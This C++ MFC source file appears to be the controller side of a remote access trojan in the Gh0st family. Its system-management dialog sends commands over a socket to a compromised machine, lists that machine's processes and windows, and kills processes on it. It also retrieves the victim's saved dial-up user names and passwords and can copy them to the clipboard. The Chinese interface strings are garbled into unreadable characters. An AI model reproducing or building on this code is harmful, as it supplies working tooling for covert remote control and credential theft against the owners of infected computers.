// SystemDlg.cpp : implementation file
//

#include "stdafx.h"
#include "Client.h"
#include "SystemDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CSystemDlg dialog


CSystemDlg::CSystemDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *pContext)
	: CDialog(CSystemDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CSystemDlg)
	//}}AFX_DATA_INIT
	m_iocpServer = pIOCPServer;
	m_pContext = pContext;
	m_hIcon = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_SYSTEM));

}


void CSystemDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CSystemDlg)
	DDX_Control(pDX, IDC_LIST_DIALUPASS, m_list_dialupass);
	DDX_Control(pDX, IDC_LIST_WINDOWS, m_list_windows);
	DDX_Control(pDX, IDC_LIST_PROCESS, m_list_process);
	DDX_Control(pDX, IDC_TAB, m_tab);
	//}}AFX_DATA_MAP
}

void CSystemDlg::OnReceiveComplete()
{
	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_PSLIST:
		ShowProcessList();
		break;
	case TOKEN_WSLIST:
		ShowWindowsList();
		break;
	case TOKEN_DIALUPASS:
		ShowDialupassList();
		break;
	default:
		// ���䷢���쳣����
		break;
	}

}

BEGIN_MESSAGE_MAP(CSystemDlg, CDialog)
	//{{AFX_MSG_MAP(CSystemDlg)
	ON_WM_CLOSE()
	ON_WM_SIZE()
	ON_NOTIFY(NM_RCLICK, IDC_LIST_PROCESS, OnRclickList)
	ON_COMMAND(IDM_KILLPROCESS, OnKillprocess)
	ON_COMMAND(IDM_REFRESHPSLIST, OnRefreshPsList)
	ON_NOTIFY(TCN_SELCHANGE, IDC_TAB, OnSelchangeTab)
	ON_COMMAND(IDM_ADSL_SAVE, OnAdslSave)
	ON_NOTIFY(NM_RCLICK, IDC_LIST_WINDOWS, OnRclickList)
	ON_NOTIFY(NM_RCLICK, IDC_LIST_DIALUPASS, OnRclickListDialupass)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CSystemDlg message handlers

void CSystemDlg::ShowProcessList()
{
	char	*lpBuffer = (char *)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	char	*strExeFile;
	char	*strProcessName;
	DWORD	dwOffset = 0;
	CString str;
	m_list_process.DeleteAllItems();

	for (int i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
	{
		LPDWORD	lpPID = LPDWORD(lpBuffer + dwOffset);
		strExeFile = lpBuffer + dwOffset + sizeof(DWORD);
		strProcessName = strExeFile + lstrlen(strExeFile) + 1;

		m_list_process.InsertItem(i, strExeFile);
		str.Format("%5u", *lpPID);
		m_list_process.SetItemText(i, 1, str);
		m_list_process.SetItemText(i, 2, strProcessName);
		// ItemData Ϊ����ID
		m_list_process.SetItemData(i, *lpPID);

		dwOffset += sizeof(DWORD) + lstrlen(strExeFile) + lstrlen(strProcessName) + 2;
	}

	str.Format("����·�� / %d", i);
	LVCOLUMN lvc;
	lvc.mask = LVCF_TEXT;
	lvc.pszText = str.GetBuffer(0);
	lvc.cchTextMax = str.GetLength();
	m_list_process.SetColumn(2, &lvc);
}

void CSystemDlg::ShowWindowsList()
{

	LPBYTE lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	DWORD	dwOffset = 0;
	char	*lpTitle = NULL;
	m_list_windows.DeleteAllItems();
	CString	str;
	for (int i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
	{
		LPDWORD	lpPID = LPDWORD(lpBuffer + dwOffset);
		lpTitle = (char *)lpBuffer + dwOffset + sizeof(DWORD);
		str.Format("%5u", *lpPID);
		m_list_windows.InsertItem(i, str);
		m_list_windows.SetItemText(i, 1, lpTitle);
		// ItemData Ϊ����ID
		m_list_windows.SetItemData(i, *lpPID);
		dwOffset += sizeof(DWORD) + lstrlen(lpTitle) + 1;
	}
	str.Format("�������� / %d", i);
	LVCOLUMN lvc;
	lvc.mask = LVCF_TEXT;
	lvc.pszText = str.GetBuffer(0);
	lvc.cchTextMax = str.GetLength();
	m_list_windows.SetColumn(1, &lvc);
}

void CSystemDlg::ShowDialupassList()
{
	LPBYTE	lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	DWORD	dwOffset = 0;
	m_list_dialupass.DeleteAllItems();
	for (int i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
	{
		for (int j = 0; j < 6; j++)
		{
			char *lpString = (char *)lpBuffer + dwOffset;
			if (j > 0)
			{
				if (j == 1)
					m_list_dialupass.InsertItem(i, lpString);
				else
					m_list_dialupass.SetItemText(i, j - 1, lpString);
			}
			dwOffset += lstrlen(lpString) + 1;
		}
	}
}


BOOL CSystemDlg::OnInitDialog() 
{
	CDialog::OnInitDialog();
	

	// TODO: Add extra initialization here
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon

	CString str;
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	str.Format("\\\\%s - ϵͳ����", bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "");
	SetWindowText(str);
	
	m_tab.InsertItem(0, "���̹���");
	m_tab.InsertItem(1, "���ڹ���");
	m_tab.InsertItem(2, "��������");

	m_list_process.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT);
	m_list_process.InsertColumn(0, "ӳ������", LVCFMT_LEFT, 100);
	m_list_process.InsertColumn(1, "PID", LVCFMT_LEFT, 50);
	m_list_process.InsertColumn(2, "����·��", LVCFMT_LEFT, 400);

	m_list_windows.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT);
	m_list_windows.InsertColumn(0, "PID", LVCFMT_LEFT, 70);
	m_list_windows.InsertColumn(1, "��������", LVCFMT_LEFT, 300);

	m_list_dialupass.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT);
	m_list_dialupass.InsertColumn(0, "����", LVCFMT_LEFT, 75);
	m_list_dialupass.InsertColumn(1, "�û�", LVCFMT_LEFT, 75);
	m_list_dialupass.InsertColumn(2, "����", LVCFMT_LEFT, 75);
	m_list_dialupass.InsertColumn(3, "�绰/����", LVCFMT_LEFT, 90);
	m_list_dialupass.InsertColumn(5, "�豸", LVCFMT_LEFT, 90);

	m_ImgList.Create(16, 16,ILC_COLOR8|ILC_MASK,15,1);
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_ICOINFO_PROCESS));
	m_list_process.SetImageList(&m_ImgList,LVSIL_SMALL);
	m_ImgList.Create(16, 16,ILC_COLOR8|ILC_MASK,15,1);
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_ICOINFO_APPWIN));	
	m_list_windows.SetImageList(&m_ImgList,LVSIL_SMALL);
	m_ImgList.Create(16, 16,ILC_COLOR8|ILC_MASK,15,1);
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_ICON_DIALU));	
	m_list_dialupass.SetImageList(&m_ImgList,LVSIL_SMALL);
	
	SortColumn1(m_nSortedCol1, m_bAscending1);
	SortColumn2(m_nSortedCol2, m_bAscending2);
	SortColumn3(m_nSortedCol3, m_bAscending3);

	AdjustList();
	ShowProcessList();
	ShowSelectWindow();
	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}


BOOL CSystemDlg::PreTranslateMessage(MSG* pMsg) 
{
	// TODO: Add your specialized code here and/or call the base class
	if (pMsg->message == WM_KEYDOWN && (pMsg->wParam == VK_RETURN || pMsg->wParam == VK_ESCAPE))
	{
		return true;
	}
	return CDialog::PreTranslateMessage(pMsg);
}

void CSystemDlg::OnClose() 
{
	// TODO: Add your message handler code here and/or call default
	m_pContext->m_Dialog[0] = 0;
	closesocket(m_pContext->m_Socket);
	CDialog::OnClose();
}

void CSystemDlg::OnSize(UINT nType, int cx, int cy) 
{
	CDialog::OnSize(nType, cx, cy);
	
	// TODO: Add your message handler code here
	AdjustList();
}

void CSystemDlg::AdjustList()
{
	RECT	rectClient;
	RECT	rectList;
	GetClientRect(&rectClient);
	rectList.left = 0;
	rectList.top = 29;
	rectList.right = rectClient.right;
	rectList.bottom = rectClient.bottom;

	m_list_process.MoveWindow(&rectList);
	m_list_windows.MoveWindow(&rectList);
	m_list_dialupass.MoveWindow(&rectList);
//	m_list_process.SetColumnWidth(2, rectList.right - m_list_process.GetColumnWidth(0) - m_list_process.GetColumnWidth(1) - 20);
}

void CSystemDlg::ShowSelectWindow()
{
	HWND hWndHeader1 = m_list_process.GetDlgItem(0)->GetSafeHwnd();
	m_header1.SubclassWindow(hWndHeader1);
	m_header1.SetTheme(new CXTPHeaderCtrlThemeOffice2003());

	HWND hWndHeader2 = m_list_windows.GetDlgItem(0)->GetSafeHwnd();
	m_header2.SubclassWindow(hWndHeader2);
	m_header2.SetTheme(new CXTPHeaderCtrlThemeOffice2003());

	HWND hWndHeader3 = m_list_dialupass.GetDlgItem(0)->GetSafeHwnd();
	m_header3.SubclassWindow(hWndHeader3);
	m_header3.SetTheme(new CXTPHeaderCtrlThemeOffice2003());

	ModifyDrawStyle(XTTHEME_WINXPTHEMES, 4);
	ModifyDrawStyle(HDR_XTP_HOTTRACKING, TRUE);
	ModifyDrawStyle(XTTHEME_HOTTRACKING, TRUE);	

	switch (m_tab.GetCurSel())
	{
	case 0:
		m_list_windows.ShowWindow(SW_HIDE);
		m_list_process.ShowWindow(SW_SHOW);
		m_list_dialupass.ShowWindow(SW_HIDE);
		if (m_list_process.GetItemCount() == 0)
			GetProcessList();
		break;
	case 1:
		m_list_windows.ShowWindow(SW_SHOW);
		m_list_process.ShowWindow(SW_HIDE);
		m_list_dialupass.ShowWindow(SW_HIDE);
		if (m_list_windows.GetItemCount() == 0)
			GetWindowsList();
		break;
	case 2:
		m_list_windows.ShowWindow(SW_HIDE);
		m_list_process.ShowWindow(SW_HIDE);
		m_list_dialupass.ShowWindow(SW_SHOW);
		if (m_list_dialupass.GetItemCount() == 0)
			GetDialupassList();
		break;
	}
}
void CSystemDlg::OnRclickList(NMHDR* pNMHDR, LRESULT* pResult) 
{
	// TODO: Add your control notification handler code here
	if (m_list_dialupass.IsWindowVisible())
		return;

	CMenu	popup;
	popup.LoadMenu(IDR_PSLIST);
	CMenu*	pM = popup.GetSubMenu(0);
	CPoint	p;
	GetCursorPos(&p);

//	pM->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);
	CXTPCommandBars::TrackPopupMenu(pM, 0, p.x, p.y,this);

	*pResult = 0;
}

void CSystemDlg::OnKillprocess() 
{
	CListCtrl	*pListCtrl = NULL;
	if (m_list_process.IsWindowVisible())
		pListCtrl = &m_list_process;
	else if (m_list_windows.IsWindowVisible())
		pListCtrl = &m_list_windows;
	else
		return;

	// TODO: Add your command handler code here
	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1 + (pListCtrl->GetSelectedCount() * 4));
	lpBuffer[0] = COMMAND_KILLPROCESS;
	
	char *lpTips = "����: ��ֹ���̻ᵼ�²�ϣ�������Ľ����\n"
		"�������ݶ�ʧ��ϵͳ���ȶ����ڱ���ֹǰ��\n"
		"���̽�û�л��ᱣ����״̬�����ݡ�";
	CString str;
	if (pListCtrl->GetSelectedCount() > 1)
	{
		str.Format("%sȷʵ\n����ֹ��%d�������?", lpTips, pListCtrl->GetSelectedCount());	
	}
	else
	{
		str.Format("%sȷʵ\n����ֹ���������?", lpTips);
	}
	if (::MessageBox(m_hWnd, str, "���̽�������", MB_YESNO|MB_ICONQUESTION) == IDNO)
		return;
	
	DWORD	dwOffset = 1;
	POSITION pos = pListCtrl->GetFirstSelectedItemPosition(); //iterator for the CListCtrl
	
	while(pos) //so long as we have a valid POSITION, we keep iterating
	{
		int	nItem = pListCtrl->GetNextSelectedItem(pos);
		DWORD dwProcessID = pListCtrl->GetItemData(nItem);
		memcpy(lpBuffer + dwOffset, &dwProcessID, sizeof(DWORD));
		dwOffset += sizeof(DWORD);
	}
	m_iocpServer->Send(m_pContext, lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

void CSystemDlg::OnRefreshPsList() 
{
	// TODO: Add your command handler code here
	if (m_list_process.IsWindowVisible())
		GetProcessList();
	if (m_list_windows.IsWindowVisible())
		GetWindowsList();
	if (m_list_dialupass.IsWindowVisible())
		GetDialupassList();

}


void CSystemDlg::GetProcessList()
{
	BYTE bToken = COMMAND_PSLIST;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}

void CSystemDlg::GetWindowsList()
{
	BYTE bToken = COMMAND_WSLIST;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}


void CSystemDlg::GetDialupassList()
{
	BYTE bToken = COMMAND_DIALUPASS;
	m_iocpServer->Send(m_pContext, &bToken, 1);	
}
void CSystemDlg::OnSelchangeTab(NMHDR* pNMHDR, LRESULT* pResult) 
{
	// TODO: Add your control notification handler code here
	ShowSelectWindow();
	*pResult = 0;
}

void CSystemDlg::SortColumn1(int iCol, bool bAsc)
{
	m_bAscending1 = bAsc;
	m_nSortedCol1 = iCol;
	
	// set sort image for header and sort column.
	CXTPSortClass csc1(&m_list_process, m_nSortedCol1);
	csc1.Sort(m_bAscending1, xtpSortString);
}

void CSystemDlg::SortColumn2(int iCol, bool bAsc)
{
	m_bAscending2 = bAsc;
	m_nSortedCol2 = iCol;
	
	// set sort image for header and sort column.
	CXTPSortClass csc2(&m_list_windows, m_nSortedCol2);;
	csc2.Sort(m_bAscending2, xtpSortString);
}

void CSystemDlg::SortColumn3(int iCol, bool bAsc)
{
	m_bAscending3 = bAsc;
	m_nSortedCol3 = iCol;
	// set sort image for header and sort column.
	CXTPSortClass csc3(&m_list_dialupass, m_nSortedCol3);
	csc3.Sort(m_bAscending3, xtpSortString);
}


BOOL CSystemDlg::OnNotify(WPARAM wParam, LPARAM lParam, LRESULT* pResult)
{
	HD_NOTIFY *pHDNotify = (HD_NOTIFY*)lParam;
	
	if (pHDNotify->hdr.code == HDN_ITEMCLICKA ||
		pHDNotify->hdr.code == HDN_ITEMCLICKW)
	{
		switch (m_tab.GetCurSel())
		{
		case 0:
			SortColumn1(pHDNotify->iItem, !m_bAscending1);
			break;
		case 1:
			SortColumn2(pHDNotify->iItem, !m_bAscending2);
			break;
		case 2:
			SortColumn3(pHDNotify->iItem, !m_bAscending3);
			break;
		}
	}
	return CDialog::OnNotify(wParam, lParam, pResult);
}

void CSystemDlg::ModifyDrawStyle(UINT uFlag, BOOL bRemove)
{
	CXTHeaderCtrlTheme* pTheme1 = m_header1.GetTheme();
	if (pTheme1)
	{
		DWORD dwStyle = pTheme1->GetDrawStyle() & ~uFlag;
		
		if (bRemove)
			dwStyle |= uFlag;
		
		pTheme1->SetDrawStyle(dwStyle, &m_header1);
		m_header1.RedrawWindow();
	}

	CXTHeaderCtrlTheme* pTheme2 = m_header2.GetTheme();
	if (pTheme2)
	{
		DWORD dwStyle = pTheme2->GetDrawStyle() & ~uFlag;
		
		if (bRemove)
			dwStyle |= uFlag;
		
		pTheme2->SetDrawStyle(dwStyle, &m_header2);
		m_header2.RedrawWindow();
	}

	CXTHeaderCtrlTheme* pTheme3 = m_header3.GetTheme();
	if (pTheme3)
	{
		DWORD dwStyle = pTheme3->GetDrawStyle() & ~uFlag;
		
		if (bRemove)
			dwStyle |= uFlag;
		
		pTheme3->SetDrawStyle(dwStyle, &m_header3);
		m_header3.RedrawWindow();
	}

}

void SetClipboardTexts(CString &Data)
{
	if(OpenClipboard(NULL) == 0)
		return;
	EmptyClipboard();
	HGLOBAL htext = GlobalAlloc(GHND, Data.GetLength() + 1);
	if(htext != 0)
	{
		CopyMemory(GlobalLock(htext), Data.GetBuffer(0), Data.GetLength());
		GlobalUnlock(htext);
		SetClipboardData(1, (HANDLE)htext);
		GlobalFree(htext);
	}
	CloseClipboard();
}

void CSystemDlg::OnAdslSave() 
{
	// TODO: Add your command handler code here
	POSITION pos = m_list_dialupass.GetFirstSelectedItemPosition();
	CString Data;
	CString Name;
	
	if  (pos  ==  NULL)
	{
		AfxMessageBox("����ѡ��Ҫ���Ƶ�����");
		return;
	}
	else
	{
		while(pos)
		{
			Name = "";
			int	nItem = m_list_dialupass.GetNextSelectedItem(pos);
			for(int i = 0; i < m_list_dialupass.GetHeaderCtrl()-> GetItemCount(); i++)
			{
				Name += m_list_dialupass.GetItemText(nItem, i);
				Name += "	";
			}
			Data += Name;
			Data += "\r\n";
		}
	}
	Data = Data.Left(Data.GetLength() - 2);
	SetClipboardTexts(Data);	
	MessageBox("��Ϣ�Ѹ��Ƶ����а�","��ʾ", MB_ICONINFORMATION);
}

void CSystemDlg::OnRclickListDialupass(NMHDR* pNMHDR, LRESULT* pResult) 
{
	// TODO: Add your control notification handler code here
	if (m_list_windows.IsWindowVisible())
		return;
	else if (m_list_process.IsWindowVisible())
		return;
	*pResult = 0;
	CMenu	popup;
	popup.LoadMenu(IDR_ADSL_COPY);
	CMenu*	pM = popup.GetSubMenu(0);
	CPoint	p;
	GetCursorPos(&p);
	
//	pM->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);
	CXTPCommandBars::TrackPopupMenu(pM, 0, p.x, p.y,this);

	*pResult = 0;
}